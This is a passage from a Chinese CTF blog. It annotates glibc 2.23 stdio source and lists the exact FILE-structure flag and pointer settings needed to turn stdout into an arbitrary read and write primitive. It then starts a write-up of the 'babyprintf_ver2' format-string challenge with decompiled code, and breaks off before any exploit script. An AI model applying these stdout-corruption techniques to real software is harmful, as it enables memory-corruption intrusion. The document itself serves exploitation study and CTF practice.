count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	  <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count); <span class="comment">/* 将目标输出数据拷贝至输出缓冲区 */</span></span><br><span class="line">	  f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  s += count; <span class="comment">/* 计算是否还有目标输出数据剩余 */</span></span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">int</span> i = (<span class="keyword">int</span>) count;</span><br><span class="line">	  <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">	    *p++ = *s++;</span><br><span class="line">	  f-&gt;_IO_write_ptr = p;</span><br><span class="line">	&#125;</span><br><span class="line">      to_do -= count; <span class="comment">/* 计算是否还有目标输出数据剩余 */</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>) </span><br><span class="line">      <span class="comment">/* 如果还有目标数据剩余，此时则表明输出缓冲区未建立或输出缓冲区已经满了 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="keyword">return</span> n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.</span></span><br><span class="line"><span class="comment">	 dont_write is what gets left over. */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base; <span class="comment">/* 检查输出数据是否是大块 */</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>任意写功能的实现在于：IO缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能，可以看到任意写好像很简单，只需将 <code>_IO_write_ptr</code> 指向 <code>write_start</code> ， <code>_IO_write_end</code> 指向 <code>write_end</code> 即可</p>
<p>将上述条件综合描述为：</p>
<ul>
<li>设置 <code>_flag &amp;~ _IO_NO_WRITES</code> 即 <code>_flag &amp;~ 0x8</code></li>
<li>设置 <code>_flag &amp; _IO_CURRENTLY_PUTTING</code> 即 <code>_flag | 0x8000</code></li>
<li>设置 <code>_IO_write_ptr</code> 指向 <code>write_start</code> （目标地址）</li>
<li>设置 <code>_IO_write_end</code> 指向 <code>write_end</code> （目标地址结束）</li>
</ul>
<p><strong>stdout任意读</strong></p>
<p>想要输出的内容会先放入输出缓冲区中，然后再输出到屏幕上</p>
<ul>
<li>如果可以控制 <code>_IO_write_base</code> ，就可以控制屏幕打印的起始地址</li>
<li>如果可以控制 <code>_IO_write_ptr</code>  ，就可以控制屏幕打印的结束地址</li>
<li>如果满足一些条件，下次调用输出函数时，就可以输出我们想要的内容</li>
</ul>
<p>当 <code>f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr</code> 时（输出缓冲区内有可用的空间），会调用 memcpy 拷贝数据到输出缓冲区，然后输出到屏幕，为了不让 memcpy 覆盖我们想要打印的数据，所以需要构造 <code>f-&gt;_IO_write_end</code> 等于 <code>f-&gt;_IO_write_ptr</code> </p>
<p>接着进入 <code>_IO_OVERFLOW</code> 函数，去刷新输出缓冲区，跟进去：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_overflow _IO_file_overflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (f, ch)</span><br><span class="line">      _IO_FILE *f;</span><br><span class="line">      <span class="keyword">int</span> ch;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) </span><br><span class="line">      <span class="comment">/* 检测IO_FILE的_flags是否包含_IO_NO_WRITES标志位 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="number">0</span>) <span class="comment">/* 表明输出缓冲区尚未建立 */</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f); <span class="comment">/* 调用_IO_doallocbuf函数去分配输出缓冲区 */</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end) <span class="comment">/* 初始化其他指针 */</span></span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF+_IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_new_do_write(f, f-&gt;_IO_write_base,</span><br><span class="line">			    f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="comment">/* 执行_IO_new_do_write,利用系统调用write输出输出缓冲区 */</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_new_do_write(f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先判断 <code>_flags</code> 是否包含 <code>_IO_NO_WRITES</code> ，如果包含则直接返回，因此需构造 <code>_flags</code> 不包含 <code>_IO_NO_WRITES</code>（其定义为 <code>#define _IO_NO_WRITES 8</code>）</li>
<li>接着判断缓冲区是否为空以及是否包含 <code>_IO_CURRENTLY_PUTTING</code> 标志位，如果包含的话则做一些多余的操作，可能不可控，因此最好定义 <code>_flags</code> 不包含 <code>_IO_CURRENTLY_PUTTING</code> ，其定义为 <code>#define _IO_CURRENTLY_PUTTING 0x800</code> </li>
<li>接着调用 <code>_IO_do_write</code> 去输出输出缓冲区，其传入的参数是 <code>f-&gt;_IO_write_base</code> ，大小为 <code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code> ，因此若想实现任意地址读，应构造 <code>_IO_write_base</code> 为 <code>read_start</code> ，构造 <code>_IO_write_ptr</code> 为 <code>read_end</code></li>
</ul>
<p>跟进去 <code>_IO_do_write</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (fp, data, to_do)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *data;</span><br><span class="line">     _IO_size_t to_do;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span> || new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(fp, data, to_do)</span></span></span><br><span class="line"><span class="function">     _IO_FILE *fp</span>;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *data;</span><br><span class="line">     _IO_size_t to_do;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       is not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>); </span><br><span class="line">      <span class="comment">/* 调整文件偏移 */</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">/* 利用系统调用更新输出缓冲区 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="comment">/* 刷新设置缓冲区指针 */</span></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF+_IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>看到在调用 <code>_IO_SYSWRITE</code> 之前还判断了 <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code> ，因此需要构造结构体使得 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> </li>
<li>也可以构造 <code>_flags</code> 包含 <code>_IO_IS_APPENDING</code> ，（<code>_IO_IS_APPENDING</code> 的定义为 <code>#define _IO_IS_APPENDING 0x1000</code> ），这样就不会走后面的这个判断而直接执行到 <code>_IO_SYSWRITE</code> 了，一般我都是设置 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code></li>
<li>最后 <code>_IO_SYSWRITE</code> 调用 <code>write (f-&gt;_fileno, data, to_do)</code> 输出数据到屏幕，因此还需构造 <code>_fileno</code> 为标准输出描述符1</li>
</ul>
<p>将上述条件综合描述为：</p>
<ul>
<li>设置 <code>_flag &amp;~ _IO_NO_WRITES</code> 即 <code>_flag &amp;~ 0x8</code></li>
<li>设置 <code>_flag &amp; _IO_CURRENTLY_PUTTING</code> 即 <code>_flag | 0x800</code></li>
<li>设置 <code>_fileno</code> 为1</li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方</li>
<li>设置 <code>_IO_write_ptr</code> 指向泄露结束的地址</li>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 或设置 <code>_flag &amp; _IO_IS_APPENDING</code>（即 <code>_flag | 0x1000</code>）</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code> （非必须）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/Stdout%E4%BB%BB%E6%84%8F%E5%86%99+Stdout%E4%BB%BB%E6%84%8F%E8%AF%BB+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84hook%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/03/Stdout%E4%BB%BB%E6%84%8F%E5%86%99+Stdout%E4%BB%BB%E6%84%8F%E8%AF%BB+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84hook%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">Stdout任意写+Stdout任意读+格式化漏洞中的hook劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-03 17:21:45" itemprop="dateCreated datePublished" datetime="2022-04-03T17:21:45+08:00">2022-04-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-24 11:26:06" itemprop="dateModified" datetime="2022-07-24T11:26:06+08:00">2022-07-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babyprintf_ver2 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./main  </span><br><span class="line">Welcome to babyprintf_v2<span class="number">.0</span></span><br><span class="line">heap is too dangrous <span class="keyword">for</span> <span class="built_in">printf</span> :(</span><br><span class="line">So I change the buffer location to <span class="number">0x563c5e002010</span></span><br><span class="line">Have fun!</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=fb30593381079dbed29611d4cc5f9c4597b208b8, stripped</span><br><span class="line">  </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/main&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，开了NX，开了PIE，开了FORTIFY，Full RELRO</p>
<p>FORTIFY：FORTIFY_SOURCE 机制对格式化字符串有两个限制</p>
<ul>
<li>包含%n的格式化字符串不能位于程序内存中的可写地址</li>
<li>当使用位置参数时，必须使用范围内的所有参数，所以如果要使用“%7$x”，你必须同时使用1,2,3,4,5,6</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release versio</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r13</span></span><br><span class="line">  FILE *v4; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+3h] [rbp-35h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babyprintf_v2.0&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;heap is too dangrous for printf :(&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;So I change the buffer location to %p\n&quot;</span>, ptr); <span class="comment">/* 绕PIE */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have fun!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    v3 = *(_QWORD *)&amp;<span class="built_in">stdout</span>[<span class="number">1</span>]._flags;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">      ptr[i] = buf; <span class="comment">/* 栈溢出 */</span></span><br><span class="line">      <span class="keyword">if</span> ( ptr[i] == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++i &gt; <span class="number">511</span> )                          <span class="comment">// 字节限制 512</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr[i] = <span class="number">0</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">    v4 = <span class="built_in">stdout</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;<span class="built_in">stdout</span>[<span class="number">1</span>]._flags != v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">&quot;rewrite vtable is not permitted!\n&quot;</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">      *(_QWORD *)&amp;v4[<span class="number">1</span>]._flags = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    __printf_chk( <span class="comment">/* __printf_chk 格式化和打印数据，并进行堆栈检查 */</span></span><br><span class="line">      <span class="number">1LL</span>,</span><br><span class="line">      ptr, <span class="comment">/* 格式化漏洞 */</span></span><br><span class="line">      <span class="number">3735928559LL</span>, <span class="comment">/* 填入了许多垃圾数据 */</span></span><br><span class="line">      <span class="number">3735928559LL</span>,</span><br><span class="line">      <span class="number">3735928559LL</span>,</span><br><span class="line">      <span class="number">3735928559LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span class="line">      <span class="number">-559038737LL</span>,</span><br><span 